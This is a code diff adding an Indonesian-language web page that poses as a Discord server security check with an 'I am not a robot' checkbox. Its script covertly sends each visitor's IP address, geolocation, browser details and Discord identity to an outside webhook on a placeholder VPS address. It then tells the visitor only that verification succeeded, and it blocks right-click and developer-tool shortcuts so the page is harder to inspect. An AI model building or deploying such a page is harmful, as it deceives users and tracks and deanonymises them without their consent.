@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verifikasi Keamanan Discord</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #7289da 0%, #5865f2 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+
+      .container {
+        background: white;
+        border-radius: 20px;
+        padding: 40px;
+        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+        max-width: 450px;
+        width: 100%;
+        text-align: center;
+        position: relative;
+      }
+
+      .discord-logo {
+        width: 60px;
+        height: 60px;
+        background: linear-gradient(135deg, #5865f2, #7289da);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+        color: white;
+        font-size: 24px;
+        font-weight: bold;
+      }
+
+      .title {
+        color: #2c3e50;
+        font-size: 28px;
+        margin-bottom: 10px;
+        font-weight: 700;
+      }
+
+      .subtitle {
+        color: #7f8c8d;
+        margin-bottom: 30px;
+        font-size: 16px;
+        line-height: 1.5;
+      }
+
+      .verification-box {
+        background: #f8f9fa;
+        border: 2px solid #e9ecef;
+        border-radius: 12px;
+        padding: 25px;
+        margin-bottom: 25px;
+        transition: all 0.3s ease;
+      }
+
+      .verification-box.processing {
+        border-color: #ffc107;
+        background: #fff3cd;
+      }
+
+      .verification-box.success {
+        border-color: #28a745;
+        background: #d4edda;
+      }
+
+      .verification-checkbox {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 15px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .checkbox {
+        width: 24px;
+        height: 24px;
+        border: 2px solid #6c757d;
+        border-radius: 4px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all 0.3s ease;
+        position: relative;
+      }
+
+      .checkbox.processing {
+        border-color: #ffc107;
+      }
+
+      .checkbox.processing::after {
+        content: "";
+        width: 16px;
+        height: 16px;
+        border: 2px solid #ffc107;
+        border-top: 2px solid transparent;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      .checkbox.success {
+        background: #28a745;
+        border-color: #28a745;
+        color: white;
+      }
+
+      .checkbox.success::after {
+        content: "✓";
+        font-size: 14px;
+        font-weight: bold;
+        animation: checkmark 0.3s ease;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes checkmark {
+        0% {
+          transform: scale(0);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+
+      .checkbox-text {
+        font-size: 16px;
+        color: #495057;
+        font-weight: 500;
+      }
+
+      .checkbox-text.processing {
+        color: #856404;
+      }
+
+      .checkbox-text.success {
+        color: #155724;
+        font-weight: 600;
+      }
+
+      .server-info {
+        background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+        border-radius: 10px;
+        padding: 20px;
+        margin-top: 20px;
+        border-left: 4px solid #2196f3;
+        display: none;
+      }
+
+      .server-info.show {
+        display: block;
+        animation: slideUp 0.5s ease;
+      }
+
+      .server-info h4 {
+        color: #1565c0;
+        margin-bottom: 10px;
+        font-size: 18px;
+      }
+
+      .server-info p {
+        color: #1976d2;
+        font-size: 14px;
+        line-height: 1.4;
+        margin-bottom: 15px;
+      }
+
+      .back-button {
+        background: linear-gradient(135deg, #5865f2, #7289da);
+        color: white;
+        border: none;
+        padding: 12px 30px;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-decoration: none;
+        display: inline-block;
+      }
+
+      .back-button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(88, 101, 242, 0.3);
+      }
+
+      .security-badge {
+        background: rgba(40, 167, 69, 0.1);
+        border: 1px solid rgba(40, 167, 69, 0.3);
+        border-radius: 20px;
+        padding: 8px 16px;
+        color: #28a745;
+        font-size: 12px;
+        font-weight: 600;
+        display: inline-block;
+        margin-top: 15px;
+      }
+
+      .error-state {
+        background: #f8d7da;
+        border: 2px solid #f5c6cb;
+        color: #721c24;
+        display: none;
+      }
+
+      .error-state.show {
+        display: block;
+      }
+
+      .dev-badge {
+        position: fixed;
+        top: 10px;
+        right: 10px;
+        background: #ffc107;
+        color: #856404;
+        padding: 8px 12px;
+        border-radius: 6px;
+        font-size: 12px;
+        font-weight: bold;
+        z-index: 9999;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+      }
+
+      @keyframes slideUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      @media (max-width: 600px) {
+        .container {
+          padding: 30px 20px;
+          margin: 10px;
+        }
+
+        .title {
+          font-size: 24px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="discord-logo">D</div>
+      <h1 class="title">Verifikasi Keamanan</h1>
+      <p class="subtitle">
+        Untuk melindungi server dari bot dan spam, silakan menyelesaikan
+        verifikasi berikut.
+      </p>
+
+      <div class="verification-box" id="verificationBox">
+        <div
+          class="verification-checkbox"
+          id="verificationCheckbox"
+          onclick="startVerification()"
+        >
+          <div class="checkbox" id="checkbox"></div>
+          <div class="checkbox-text" id="checkboxText">Saya bukan robot</div>
+        </div>
+      </div>
+
+      <div class="server-info" id="serverInfo">
+        <h4>✅ Verifikasi Berhasil!</h4>
+        <p>
+          Anda telah berhasil diverifikasi sebagai pengguna asli. Role Discord
+          akan diberikan secara otomatis dan Anda dapat kembali ke server.
+        </p>
+        <a href="#" class="back-button" onclick="goBackToDiscord()"
+          >🎮 Kembali ke Discord</a
+        >
+        <div class="security-badge">🔒 Keamanan Terverifikasi</div>
+      </div>
+    </div>
+
+    <script>
+      let trackingId = null;
+      let verificationInProgress = false;
+      let verificationData = null;
+
+      // ⚠️ EDIT THIS: Your VPS IP and port
+      const WEBHOOK_URL = "http://YOUR_VPS_IP:3001/webhook/verification";
+
+      // Get verification parameters from URL
+      function getVerificationParams() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return {
+          trackingId: urlParams.get("track"),
+          userId: urlParams.get("user"),
+          username: urlParams.get("username"),
+          guildId: urlParams.get("guild"),
+          guildName: urlParams.get("guildname"),
+        };
+      }
+
+      // Start verification process
+      function startVerification() {
+        if (verificationInProgress) return;
+
+        verificationInProgress = true;
+
+        // Update UI to processing state
+        const checkbox = document.getElementById("checkbox");
+        const checkboxText = document.getElementById("checkboxText");
+        const verificationBox = document.getElementById("verificationBox");
+
+        checkbox.className = "checkbox processing";
+        checkboxText.className = "checkbox-text processing";
+        checkboxText.textContent = "Memverifikasi...";
+        verificationBox.className = "verification-box processing";
+
+        // Remove click handler
+        document.getElementById("verificationCheckbox").onclick = null;
+        document.getElementById("verificationCheckbox").style.cursor =
+          "default";
+
+        // Start actual verification
+        performVerification();
+      }
+
+      // Perform verification and IP tracking
+      function performVerification() {
+        // Get IP and location data
+        fetch("https://ipapi.co/json/")
+          .then((response) => response.json())
+          .then((ipData) => {
+            // Send to VPS webhook
+            sendToWebhook(ipData).then((success) => {
+              setTimeout(() => {
+                completeVerification();
+              }, 1500);
+            });
+          })
+          .catch((error) => {
+            console.error("IP tracking failed:", error);
+            // Still complete verification for user experience
+            setTimeout(() => {
+              completeVerification();
+            }, 1500);
+          });
+      }
+
+      // Send data to VPS webhook
+      async function sendToWebhook(ipData) {
+        try {
+          const response = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              trackingId: trackingId,
+              ipData: ipData,
+              userAgent: navigator.userAgent,
+              timestamp: new Date().toISOString(),
+              verificationData: verificationData,
+            }),
+          });
+
+          const result = await response.json();
+          console.log("Verification result:", result);
+          return response.ok;
+        } catch (error) {
+          console.error("Error sending to webhook:", error);
+          return false;
+        }
+      }
+
+      // Complete verification process
+      function completeVerification() {
+        const checkbox = document.getElementById("checkbox");
+        const checkboxText = document.getElementById("checkboxText");
+        const verificationBox = document.getElementById("verificationBox");
+        const serverInfo = document.getElementById("serverInfo");
+
+        // Update to success state
+        checkbox.className = "checkbox success";
+        checkboxText.className = "checkbox-text success";
+        checkboxText.textContent = "Verifikasi berhasil!";
+        verificationBox.className = "verification-box success";
+
+        // Show success info
+        setTimeout(() => {
+          serverInfo.classList.add("show");
+        }, 800);
+      }
+
+      // Go back to Discord
+      function goBackToDiscord() {
+        try {
+          window.close();
+        } catch (e) {
+          alert(
+            "Silakan tutup tab ini dan kembali ke Discord. Role Anda telah diberikan secara otomatis!"
+          );
+        }
+      }
+
+      // Initialize when page loads
+      window.onload = function () {
+        const params = getVerificationParams();
+        trackingId = params.trackingId;
+
+        // Store verification data
+        verificationData = {
+          userId: params.userId,
+          username: params.username,
+          guildId: params.guildId,
+          guildName: params.guildName,
+        };
+
+        // Development mode check
+        if (!trackingId) {
+          if (
+            window.location.hostname === "127.0.0.1" ||
+            window.location.hostname === "localhost"
+          ) {
+            trackingId = "dev-test-" + Date.now();
+            verificationData = {
+              userId: "123456789",
+              username: "TestUser#1234",
+              guildId: "987654321",
+              guildName: "Test Server",
+            };
+
+            // Add dev badge
+            const devBadge = document.createElement("div");
+            devBadge.className = "dev-badge";
+            devBadge.textContent = "🔧 DEV MODE";
+            document.body.appendChild(devBadge);
+
+            console.log("🔧 Development mode active");
+          } else {
+            // Show error in production
+            const verificationBox = document.getElementById("verificationBox");
+            verificationBox.className = "verification-box error-state show";
+            verificationBox.innerHTML = `
+                        <div style="color: #721c24; text-align: center;">
+                            <strong>❌ Link verifikasi tidak valid</strong><br>
+                            <small>Silakan gunakan link verifikasi yang baru dari Discord server.</small>
+                        </div>
+                    `;
+            return;
+          }
+        }
+
+        // Add animation
+        document.querySelector(".container").style.animation =
+          "slideUp 0.5s ease";
+      };
+
+      // Basic protection
+      document.addEventListener("contextmenu", (e) => e.preventDefault());
+      document.addEventListener("keydown", function (e) {
+        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+          e.preventDefault();
+        }
+      });
+    </script>
+  </body>
+</html>
